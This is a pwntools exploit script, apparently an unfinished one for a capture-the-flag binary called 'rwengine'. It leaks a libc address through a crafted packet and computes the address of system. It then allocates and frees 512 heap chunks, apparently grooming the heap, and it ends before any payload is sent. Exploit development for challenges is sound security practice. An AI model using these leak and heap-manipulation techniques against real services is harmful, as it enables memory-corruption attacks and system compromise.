from pwn import *
import struct

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Leak
send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()
page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])
libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
system_addr = libc_base + libc.symbols['system']

log.info(f"page_ptr = {hex(page_ptr)}")
log.info(f"libc_base = {hex(libc_base)}")
log.info(f"system_addr = {hex(system_addr)}")

# Allocate 512 chunks
log.info("Allocating 512 chunks...")
for i in range(512):
    send_pkt(0x12, struct.pack(">H", 1))
    status, resp = recv_pkt()

log.info("Freeing 512 chunks...")
for i in range(512):
    send_pkt(0x13, struct.pack(">H", i))
    status, resp = recv_pkt()

log.info(f"Freeing 511th chunk status: {status}")

io.close()
